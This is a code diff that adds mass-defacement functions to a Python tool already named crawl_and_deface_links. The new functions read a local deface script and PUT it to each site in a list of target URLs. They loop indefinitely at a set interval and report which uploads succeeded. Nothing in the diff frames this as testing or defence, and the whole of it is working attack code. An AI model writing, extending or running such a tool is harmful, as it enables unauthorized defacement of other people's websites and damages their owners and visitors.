@@ -129,6 +129,36 @@ def crawl_and_deface_links():
     except KeyboardInterrupt:
         print()
 
+def auto_upload_deface(script, links, interval_ms):
+    while True:
+        for link in links:
+            auto_upload(script, link)
+            time.sleep(interval_ms / 1000)  # Convert interval to seconds
+
+def auto_upload(script, target_url):
+    try:
+        a = script
+        if not os.path.isfile(a):
+            print("File '%s' not found" % a)
+            return
+        target_url = target_url
+        op = open(a, "r").read()
+        s = requests.Session()
+        try:
+            site = target_url.strip()
+            if not site.startswith("http://"):
+                site = "http://" + site
+            req = s.put(site + "/" + a, data=op)
+            if req.status_code > 200 or req.status_code >= 250:
+                print(m + ">" + b + "[-] FAILED" + b + " %s/%s" % (site, a))
+            else:
+                print(m + ">" + h + "[+] UPLOADED" + h + " %s/%s" % (site, a))
+        except requests.exceptions.RequestException:
+            print(m + ">" + b + "[-] FAILED" + b + " %s" % target_url)
+
+    except KeyboardInterrupt:
+        print()
+
 def main(__bn__):
     print(__bn__)
     while True:
